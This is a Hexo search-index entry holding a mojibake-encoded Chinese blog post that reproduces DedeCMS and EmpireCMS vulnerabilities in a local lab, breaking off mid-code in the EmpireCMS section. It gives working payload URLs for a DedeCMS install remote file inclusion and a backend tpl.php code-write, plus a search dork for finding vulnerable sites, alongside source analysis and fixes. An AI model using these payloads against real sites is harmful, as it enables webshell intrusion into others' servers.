<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ç»‡æ¢¦cmsã€å¸å›½cmsçš„æ­å»ºåŠæ¼æ´å¤ç°</title>
    <link href="/2021/02/14/%E7%BB%87%E6%A2%A6cms%E4%BB%A5%E5%8F%8A%E5%B8%9D%E5%9B%BDcms%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/02/14/%E7%BB%87%E6%A2%A6cms%E4%BB%A5%E5%8F%8A%E5%B8%9D%E5%9B%BDcms%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- more --><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™é‡Œçœ‹åˆ°phpstudyè‡ªå¸¦äº†è¿™ç»‡æ¢¦cmså’Œå¸å›½cmsï¼Œå¯èƒ½æ˜¯æ¯”è¾ƒç»å…¸çš„cmså§</p><p>å› æ­¤æ‰“ç®—å®‰è£…è¿™ä¸¤æ ·å¤ç°ä¸€ä¸‹æ¼æ´</p><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>é¦–å…ˆåœ¨å®˜ç½‘ä¸‹è½½æºç ~</p><p>ç»‡æ¢¦cmsï¼š<a href="http://www.dedecms.com/products/dedecms/downloads/">äº§ å“ / DedeCMS / è½¯ä»¶ä¸‹è½½_ç»‡æ¢¦CMS</a></p><p>å¸å›½cmsï¼š<a href="http://www.phome.net/download/">å¸å›½è½¯ä»¶ -&gt; äº§å“ä¸‹è½½ (phome.net)</a></p><p>æˆ‘ä¸‹è½½çš„æ˜¯è¿™ä¸¤ä¸ªï¼š</p><p><img src="https://i.loli.net/2021/02/13/1SHLytuQWisp8PO.png" alt="7FYRZI___K__YW_X_BR0YIS.png"></p><p>å…·ä½“å®‰è£…è¿‡ç¨‹å¾ˆç®€å•ï¼Œè·Ÿç€æ•™ç¨‹èµ°å°±å¯ä»¥äº†</p><p>è¿›å…¥å®‰è£…ç›®å½•ï¼Œé€æ­¥å¡«å†™ä¿¡æ¯å³å¯</p><blockquote><p>å®‰è£…ç›®å½•ï¼š</p><p>ç»‡æ¢¦cmsï¼šuploads/install</p><p>å¸å›½cmsï¼šupload/e/install</p><p>ps:åœ¨çœŸå®é…ç½®çš„æ—¶å€™æ˜¯å°†uploadä¸­çš„æºæ–‡ä»¶å¤åˆ¶åˆ°æœåŠ¡å™¨ç›®å½•ä¸­ã€‚è¿™é‡Œæˆ‘ç›´æ¥è§£å‹äº†~</p></blockquote><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><h3 id="ç»‡æ¢¦cms"><a href="#ç»‡æ¢¦cms" class="headerlink" title="ç»‡æ¢¦cms"></a>ç»‡æ¢¦cms</h3><p>dedecmsçš„æ¼æ´å¾ˆå¤šï¼Œæ¯”è¾ƒç”¨çš„äººå¤šäº†ï¼Œæ‰¾æ´çš„äººä¹Ÿå°±å¤šäº†ã€‚</p><p>è¿™é‡Œå…ˆéšä¾¿æŒ‘ä¸¤ä¸ªå¤ç°ä¸€ä¸‹</p><p>psï¼šgoogle hackæœç´¢dedecmsæ­å»ºçš„ç½‘ç«™ï¼š<code>intitle:powered by dedecms</code></p><p><img src="https://i.loli.net/2021/02/14/5scAk7leiI3Qx1j.jpg" alt="google_hackå¸¸ç”¨è¯­æ³•"></p><h4 id="5-7-SP1è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´-CVE-2015-4553"><a href="#5-7-SP1è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´-CVE-2015-4553" class="headerlink" title="5.7-SP1è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´(CVE-2015-4553)"></a>5.7-SP1è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´(CVE-2015-4553)</h4><blockquote><p>å½±å“ç‰ˆæœ¬ï¼šDeDeCMS &lt; 5.7-sp1,åŒ…æ‹¬5.7 sp1ç‰ˆæœ¬</p><p>æè¿°ï¼šè¯¥æ¼æ´å­˜åœ¨äº/install/index.phpä¸­(å®‰è£…åä¸ºindex.php.bak)ã€‚ç”±äº$$ç¬¦å·çš„ä½¿ç”¨ä¸å½“ï¼ˆå³å¯å˜å˜é‡ï¼‰å¯¼è‡´å˜é‡è¦†ç›–ï¼Œæœ€ç»ˆå¼•å‘è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´</p><p>ä¿®å¤ï¼šå°†ç›¸å…³å˜é‡æ”¹ä¸ºå¸¸é‡å®šä¹‰</p></blockquote><p>ç»‡æ¢¦cms5.7 sp1ï¼š<a href="http://www.downcode.com/downcode/j_12898.shtml">ç»‡æ¢¦CMS(DedeCMS) v5.7 SP1 UTF8 build20150618 - æºç ä¸‹è½½ (downcode.com)</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;_GET&#x27;</span>,<span class="hljs-string">&#x27;_POST&#x27;</span>,<span class="hljs-string">&#x27;_COOKIE&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$_request</span>)<br>    <span class="hljs-comment">#ç”¨foreachéå†æ•°ç»„ï¼Œæ¯æ¬¡å¾ªç¯å°†æ•°ç»„å•å…ƒçš„å€¼èµ‹ç»™$_requestï¼ˆä»¥getã€postã€cookieä¼ å…¥çš„å€¼ï¼‰</span><br>&#123;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$_request</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span> =&gt; <span class="hljs-variable">$_v</span>) $&#123;<span class="hljs-variable">$_k</span>&#125; = RunMagicQuotes(<span class="hljs-variable">$_v</span>);<br>    <span class="hljs-comment">#foreachéå†æ•°ç»„ï¼Œå°†å½“å‰æ•°ç»„å•å…ƒçš„é”®åèµ‹ç»™$_kï¼Œå½“å‰æ•°ç»„å•å…ƒçš„å€¼èµ‹ç»™$_vã€‚</span><br>    <span class="hljs-comment">#RunMagicQuotes()ä½œä¸ºè¿‡æ»¤å‡½æ•°å­˜åœ¨</span><br>    <span class="hljs-comment">#$$_requestï¼šå¯å˜å˜é‡ï¼Œä»¥$_requestè¿™ä¸ªå˜é‡çš„å€¼ä½œä¸ºå˜é‡å</span><br>    <span class="hljs-comment">#$&#123;$_k&#125;ï¼šPHPåˆ†æåŒå¼•å·ä¸­çš„æ•°æ®æ˜¯å¦å«æœ‰å˜é‡ï¼ˆå¹¶è§£æå®ƒçš„å€¼ï¼‰ï¼Œå½“ç”¨åŒå¼•å·æ—¶,&#123;&#125;ç”¨æ¥ç•Œå®šå˜é‡çš„ç•Œé™ã€‚</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">function _RunMagicQuotesï¼ˆ&amp;$svarï¼‰&#123;<br><span class="hljs-keyword">if</span>ï¼ˆï¼get_magic_quotes_gpcï¼ˆï¼‰ï¼‰&#123;<br>    <br><span class="hljs-keyword">if</span>ï¼ˆis_arrayï¼ˆ<span class="hljs-variable">$svar</span>ï¼‰ï¼‰&#123;<br><span class="hljs-keyword">foreach</span>ï¼ˆ<span class="hljs-variable">$svar</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span> =&gt; <span class="hljs-variable">$_v</span>ï¼‰<span class="hljs-variable">$svar</span>[<span class="hljs-variable">$_k</span>] = _RunMagicQuotesï¼ˆ<span class="hljs-variable">$_v</span>ï¼‰ï¼›<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <br><span class="hljs-keyword">if</span>ï¼ˆstrlenï¼ˆ<span class="hljs-variable">$svar</span>ï¼‰&gt;<span class="hljs-number">0</span>&amp;&amp;preg_matchï¼ˆ<span class="hljs-string">&#x27;#^ï¼ˆcfg_|GLOBALS|_GET|_POST|_COOKIEï¼‰#&#x27;</span>ï¼Œ<span class="hljs-variable">$svar</span>ï¼‰ï¼‰&#123;<br><span class="hljs-keyword">exit</span>ï¼ˆ<span class="hljs-string">&#x27;Request var not allowï¼&#x27;</span>ï¼‰ï¼›<br>    &#125;<br>        <br><span class="hljs-variable">$svar</span> = addslashesï¼ˆ<span class="hljs-variable">$svar</span>ï¼‰ï¼›<br>        <span class="hljs-comment">#ä½¿ç”¨addslashesï¼ˆï¼‰å‡½æ•°è¿‡æ»¤</span><br>        <span class="hljs-comment">#åœ¨æŸäº›å­—ç¬¦å‰åŠ ä¸Šäº†åæ–œçº¿ã€‚: å¼•å·ï¼ˆ&#x27;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ã€ NULLï¼ˆnull å­—ç¬¦ï¼‰</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$svar</span>ï¼›<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®å®‰è£…é¡µé¢ï¼Œç”±äºinstall_lockçš„å­˜åœ¨ï¼Œæ— æ³•é‡æ–°å®‰è£…ï¼š</p><p><img src="https://i.loli.net/2021/02/14/Fm1CsbuBn6LYoZW.png"></p><p>åˆ¤æ–­åŸç†ï¼šå®šä¹‰äº†å˜é‡$insLockfileï¼Œåˆ©ç”¨file_exists()åˆ¤æ–­install_lock.txtæ˜¯å¦å­˜åœ¨<br>ï¼ˆå–ä¸å­˜åœ¨çš„æ–‡ä»¶å³å¯ä½¿åˆ¤æ–­æ¡ä»¶å¤±æ•ˆï¼‰</p><p><img src="https://i.loli.net/2021/02/14/4J1kzME8CPFAxqH.png"></p><p>ç”±æ­¤è¿›è¡Œå˜é‡è¦†ç›–å³å¯ç»•è¿‡ä¸Šè¿°åˆ¤æ–­ <code>xxx/uploads/install/index.php?insLockfile=1</code></p><p><img src="https://i.loli.net/2021/02/14/qQlDNRW7B2nJY6k.png"></p><p>åç»­ç”±äºinstall_lock.txtçš„å­˜åœ¨ï¼Œä½¿å¾—å®‰è£…æ— æ³•è¿è´¯ï¼Œä½†è®¿é—®ç›¸åº”çš„é¡µé¢è¿˜æ˜¯å¯ä»¥çš„</p><p>å¦‚ï¼š<code>xxx/uploads/install/index.php?step=3&amp;insLockfile=1</code>ï¼ˆç”±æ­¤æˆ‘ä»¬å¯ä»¥åœ¨åé¢è®¿é—®step=11ï¼‰</p><p><img src="https://i.loli.net/2021/02/14/gG5cka9ZzYQHDRd.png"></p><p>å†çœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$step</span>==<span class="hljs-number">11</span>)<br>&#123;<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;../data/admin/config_update.php&#x27;</span>);<br>    <span class="hljs-comment">#åŒ…å«äº†../data/admin/config_update.php,åœ¨å…¶ä¸­å®šä¹‰äº†updateHostå’ŒlinkHost</span><br>    <br><span class="hljs-variable">$rmurl</span> = <span class="hljs-variable">$updateHost</span>.<span class="hljs-string">&quot;dedecms/demodata.<span class="hljs-subst">&#123;$s_lang&#125;</span>.txt&quot;</span>;<br><span class="hljs-comment">#å°†config_update.phpä¸­çš„UPDATEHOSTä¸dedecms/demodata.&#123;$s_lang&#125;.txtæ‹¼æ¥ä¸ºå­—ç¬¦ä¸²</span><br>    <br><span class="hljs-variable">$sql_content</span> = file_get_contents(<span class="hljs-variable">$rmurl</span>);<br>    <span class="hljs-comment">#åˆ©ç”¨file_get_contents()è¯»å–$rmurlæŒ‡ä»£çš„æ–‡ä»¶å†…å®¹</span><br>    <br><span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$install_demo_name</span>,<span class="hljs-string">&#x27;w&#x27;</span>);<span class="hljs-comment">#å®šä¹‰å˜é‡$fp,æ‰“å¼€$install_demo_nameæŒ‡ä»£çš„æ–‡ä»¶(wæƒé™)</span><br><span class="hljs-keyword">if</span>(fwrite(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$sql_content</span>))<span class="hljs-comment">#å°†$sql_contentå†™å…¥åˆ°$install_demo_nameæŒ‡ä»£çš„æ–‡ä»¶</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&amp;nbsp; &lt;font color=&quot;green&quot;&gt;[âˆš]&lt;/font&gt; å­˜åœ¨(æ‚¨å¯ä»¥é€‰æ‹©å®‰è£…è¿›è¡Œä½“éªŒ)&#x27;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&amp;nbsp; &lt;font color=&quot;red&quot;&gt;[Ã—]&lt;/font&gt; è¿œç¨‹è·å–å¤±è´¥&#x27;</span>;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$sql_content</span>);<br>fclose(<span class="hljs-variable">$fp</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒ…å«çš„config_updateï¼Œå…¶ä¸­å®šä¹‰äº†å˜é‡updateHostå’ŒlinkHost</p><p><img src="https://i.loli.net/2021/02/14/Vj3Z1m9YvATG6fu.png"></p><p>åˆ©ç”¨ï¼š</p><p>1.åˆ¤æ–­è¯­å¥ä¸ºif(step==11ï¼‰ï¼Œé¡»ä¼ å…¥step=11ï¼›<br>å­˜åœ¨install_lock.txtï¼Œä¼ å…¥insLockfile=1ï¼ˆå–ä¸å­˜åœ¨çš„æ–‡ä»¶ä½¿å¾—åˆ¤æ–­æ¡ä»¶å¤±æ•ˆï¼‰</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">payloadï¼š<br>xxx<span class="hljs-regexp">/uploads/i</span>nstall/index.php?<span class="hljs-keyword">step</span>=<span class="hljs-number">11</span>&amp;insLockfile=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/14/tHFvmb8LRqnlY4p.png"></p><p>2.updateHostæ˜¯æ¥è‡ªäºconfig_update.phpçš„åŒ…å«ï¼Œæ— æ³•ç›´æ¥å°†è¯¥å˜é‡è¦†ç›–ã€‚<br>æ•…éœ€è¦å€Ÿç”¨<code>fopen($install_demo_name,&#39;w&#39;)</code><strong>å°†config_update.phpæ¸…ç©º</strong><br>(wæƒé™ç‰¹è´¨, æ–‡ä»¶å­˜åœ¨åˆ™æ¸…ç©ºå†…å®¹å†å†™å…¥)</p><p>æ„é€ payloadï¼š</p><p>ä¼ å…¥<code>$install_demo_name=config_update.phpï¼›</code></p><p>è€Œ<code>fwrite($fp,$sql_content)</code>çš„å­˜åœ¨ä¼šå°† <code>$sql_content</code> å†™å…¥<code>config_update.php</code></p><p><code>$sql_content</code>æ˜¯æå–<code>$rmurl</code>æŒ‡ä»£çš„æ–‡ä»¶å†…å®¹å†™å…¥</p><p><code>file_get_contents</code>è¯»å–å¤±è´¥æ—¶è¿”å›NULLï¼Œå› æ­¤æ§åˆ¶<code>$s_lang</code>ä¸ºä¸å­˜åœ¨çš„æ–‡ä»¶åå³å¯ä½¿<code>$sql_content</code>= NULL</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">payloadï¼š<br>xxx<span class="hljs-regexp">/uploads/i</span>nstall<span class="hljs-regexp">/index.php?step=11&amp;insLockfile=1&amp;install_demo_name=../</span>data<span class="hljs-regexp">/admin/</span>config_update.php&amp;s_lang=hhhhhh<br></code></pre></td></tr></table></figure><p>æ˜¾ç¤ºä¸º0kbï¼Œæ˜¾ç„¶config_update.phpå·²è¢«æ¸…ç©ºäº†</p><p><img src="https://i.loli.net/2021/02/14/PUsAi5xjzIXw1c7.png"></p><p>3.éšç€config_update.phpçš„æ¸…ç©ºï¼Œå‚æ•°updateHostå˜å¾—å¯æ§ï¼Œå¯ä»¥å¼€å§‹è¿œç¨‹ä¸Šä¼ æ–‡ä»¶äº†~</p><p>åœ¨kaliä¸Šåˆ›å»ºä¸€ä¸ªdedecmsæ–‡ä»¶å¤¹,ç„¶ååˆ›å»ºä¸€ä¸ªdemodata.gb2312.txt,å†™å…¥<code>&lt;?php phpinfo();?&gt;</code> </p><p>ç„¶åå¼€å¯webæœåŠ¡: <code>sudo service apache2 start</code></p><p><img src="https://i.loli.net/2021/02/14/P7RzZ83vpw1kISt.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">payloadï¼š<br>xxx<span class="hljs-regexp">/uploads/i</span>nstall<span class="hljs-regexp">/index.php?step=11&amp;insLockfile=1&amp;install_demo_name=../i</span>nfo.php&amp;updateHost=ç›®æ ‡ä¸»æœºip<br></code></pre></td></tr></table></figure><p>æ˜¾ç¤ºå¦‚ä¸‹ç”»é¢å³æˆåŠŸ</p><p><img src="https://i.loli.net/2021/02/14/tHFvmb8LRqnlY4p.png"></p><p>å¦‚ä¸‹</p><p><img src="https://i.loli.net/2021/02/14/DEIowJPlQvh3dyG.png"></p><p>æ­¤æ¼æ´æ ¹æºè¿˜æ˜¯å˜é‡è¦†ç›–ï¼Œä¿®å¤ï¼š</p><p>1ã€å¯ä»¥çœ‹çœ‹DISCUZæ˜¯æ€ä¹ˆåšçš„ï¼Œå½“å‘ç°KEYçš„ç¬¬ä¸€ä¸ªå­—ç¬¦å­˜åœ¨_å°±ä¸æ³¨å†Œå˜é‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">array</span>(â€˜_COOKIEâ€™, â€˜_POSTâ€™, â€˜_GETâ€™) <span class="hljs-keyword">as</span> <span class="hljs-variable">$_request</span>) &#123;<br><br> <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$_request</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_key</span> =&gt; <span class="hljs-variable">$_value</span>) &#123;<br><br> <span class="hljs-variable">$_key</span>&#123;<span class="hljs-number">0</span>&#125; != â€˜_â€™ &amp;&amp; <span class="hljs-variable">$$_key</span> = daddslashes(<span class="hljs-variable">$_value</span>);<br><br> &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>2ã€å®˜æ–¹sp2ï¼š</p><p>åˆ©ç”¨defineå‡½æ•°æ„é€ ä¸ºå¸¸é‡</p><h4 id="5-7-SP2åå°ä»£ç æ‰§è¡Œæ¼æ´-CNVD-2018-01221"><a href="#5-7-SP2åå°ä»£ç æ‰§è¡Œæ¼æ´-CNVD-2018-01221" class="headerlink" title="5.7-SP2åå°ä»£ç æ‰§è¡Œæ¼æ´(CNVD-2018-01221)"></a>5.7-SP2åå°ä»£ç æ‰§è¡Œæ¼æ´(CNVD-2018-01221)</h4><blockquote><p>å½±å“ç‰ˆæœ¬ï¼šDeDeCMS &lt; 5.7-sp2,åŒ…æ‹¬5.7 sp2ç‰ˆæœ¬</p><p>æè¿°ï¼štpl.phpä¸­å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´,å¯ä»¥é€šè¿‡è¯¥æ¼æ´åœ¨å¢åŠ æ–°æ ‡ç­¾ä¸­ä¸Šä¼ æœ¨é©¬,è·å–webshellã€‚<br>åˆ©ç”¨æ¡ä»¶ï¼šéœ€è¦ç™»å½•åå°ï¼›åå°çš„è´¦æˆ·æƒé™æ˜¯ç®¡ç†å‘˜æƒé™ã€‚</p></blockquote><p>1ã€æ­¤å¤„è¦æ±‚å…·æœ‰ç®¡ç†å‘˜æƒé™ï¼Œå¹¶ç™»å…¥åå°</p><p>2ã€åˆ†ædede/tpl.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">...<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;savetagfile&#x27;</span>)<br>    <span class="hljs-comment">#$actionå¿…é¡»ç­‰äºsavetagfileæ‰èƒ½æ‰§è¡Œä¸‹é¢ä»£ç </span><br>&#123;<br>    csrf_check();<span class="hljs-comment">#æ£€éªŒcsrfï¼Œå¿…é¡»æ·»åŠ tokenè¿›è¡Œç»•è¿‡</span><br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i&quot;</span>, <span class="hljs-variable">$filename</span>))<br>        <span class="hljs-comment">#æ­¤å¤„æ­£åˆ™åŒ¹é…ï¼š[a-z0-9_-]ä»»æ„å­—ç¬¦(å¤§äº1æ¬¡) + .lib.php çš„å­—ç¬¦ä¸²ï¼šxxx.lib.php</span><br>        <span class="hljs-comment">#$filenameä¸ç¬¦åˆæ­£åˆ™è¡¨è¾¾åˆ™æ— æ³•è¿›è¡Œä¿®æ”¹ï¼Œæ„é€ ç¬¦å·æ­£åˆ™çš„$filenameå³å¯</span><br>    &#123;<br>        ShowMsg(<span class="hljs-string">&#x27;æ–‡ä»¶åä¸åˆæ³•ï¼Œä¸å…è®¸è¿›è¡Œæ“ä½œï¼&#x27;</span>, <span class="hljs-string">&#x27;-1&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">require_once</span>(DEDEINC.<span class="hljs-string">&#x27;/oxwindow.class.php&#x27;</span>);<br>    <span class="hljs-variable">$tagname</span> = preg_replace(<span class="hljs-string">&quot;#\.lib\.php$#i&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$filename</span>);<br>    <span class="hljs-variable">$content</span> = stripslashes(<span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$truefile</span> = DEDEINC.<span class="hljs-string">&#x27;/taglib/&#x27;</span>.<span class="hljs-variable">$filename</span>;<br>    <span class="hljs-comment">#ä¼ å…¥çš„è·¯å¾„ä¸ºinclude/taglib/filename(å¸¸é‡DEDEINC=include)</span><br>    <span class="hljs-variable">$fp</span> = fopen(<span class="hljs-variable">$truefile</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>    fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$content</span>);<span class="hljs-comment">#å°†$contentçš„å†…å®¹å†™å…¥$fpä»£è¡¨çš„è·¯å¾„</span><br>    fclose(<span class="hljs-variable">$fp</span>);<br>    ...<br></code></pre></td></tr></table></figure><p>æ­¤å¤„æ­£åˆ™åŒ¹é…ï¼š[a-z0-9_-]ä»»æ„å­—ç¬¦(å¤§äº1æ¬¡) + .lib.php çš„å­—ç¬¦ä¸²ï¼šxxx.lib.php<br><img src="https://i.loli.net/2021/02/14/rX9lOf3dHRJyiGD.png"></p><p>3ã€è·å–tokenç»•è¿‡csrf</p><p>æŸ¥çœ‹tpl.phpï¼Œå‘ç°actionæœ‰å¾ˆå¤šå‚æ•°ï¼Œä½†ä»…å½“action=uploadæ‰èƒ½è·å–token</p><p><img src="https://i.loli.net/2021/02/14/hNAKDiyJRT9jeBL.png"></p><p>è®¿é—®tpl.php?action=uploadï¼›æŸ¥çœ‹é¡µé¢æºä»£ç å³å¯è·å–token</p><p><img src="https://i.loli.net/2021/02/14/82xRVBh3gONomtQ.png"></p><p>4ã€</p><p>ä¸Šä¼ å‚æ•°ï¼š<br>(ç”±äºdedecmså…¨å±€å˜é‡æ³¨å†Œçš„ç‰¹æ€§ï¼Œcontentå˜é‡å’Œfilenameå˜é‡å¯æ§ï¼Œå¯ä»¥ç›´æ¥å°†contentå†™å…¥xxx.lib.phpæ–‡ä»¶)<br><code>action=savetagfile</code><br><code>token=ä¸Šé¢action=uploadè·å–çš„token</code><br><code>content=è¦å†™å…¥çš„ğŸ</code><br><code>filename=xxx.lib.phpï¼ˆè¦åŒ¹é…æ­£åˆ™ï¼‰</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">payload:<br>dede/tpl.php?action=savetagfile&amp;token=<span class="hljs-number">6</span>ef0da020e1836c5401127d2605cb35b&amp;filename=info.lib.php&amp;content=<span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¹‹å‰æŸ¥çœ‹ä»£ç å¯çŸ¥ä¼ å…¥çš„è·¯å¾„ä¸ºinclude/taglib/$filename</p><p>è®¿é—®<code>include/taglib/info.lib.php</code>å³å¯</p><p><img src="https://i.loli.net/2021/02/14/dIOG1YUcrPkWjHg.png"></p><p>ä¿®å¤ï¼š</p><p>1.ç¦æ­¢æ­¤å¤„å†™å…¥æ–‡ä»¶ã€‚</p><p>2.è¿‡æ»¤æ¶æ„æ ‡ç­¾</p><h3 id="å¸å›½cms"><a href="#å¸å›½cms" class="headerlink" title="å¸å›½cms"></a>å¸å›½cms</h3><h4 id="7-5åå°getshell-CVE-2018-18086"><a href="#7-5åå°getshell-CVE-2018-18086" class="headerlink" title="7.5åå°getshell(CVE-2018-18086)"></a>7.5åå°getshell(CVE-2018-18086)</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">å½±å“ç‰ˆæœ¬ï¼šå¸å›½CMS(EmpireCMS) &lt;= <span class="hljs-number">7.5</span><br><br>æè¿°ï¼šEmpireCMS7.<span class="hljs-number">5</span>ç‰ˆæœ¬ä¸­çš„<span class="hljs-regexp">/e/</span><span class="hljs-keyword">class</span>/moddofun.phpæ–‡ä»¶çš„â€LoadInModâ€å‡½æ•°å­˜åœ¨å®‰å…¨æ¼æ´,æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´ä¸Šä¼ ä»»æ„æ–‡ä»¶ã€‚<br></code></pre></td></tr></table></figure><p>ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼š</p><p>/e/admin/ecmsmod.phpä¸­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//å¯¼å…¥æ¨¡å‹</span><br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$enews</span>==<span class="hljs-string">&quot;LoadInMod&quot;</span>)<br>&#123;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_type</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span>=<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span 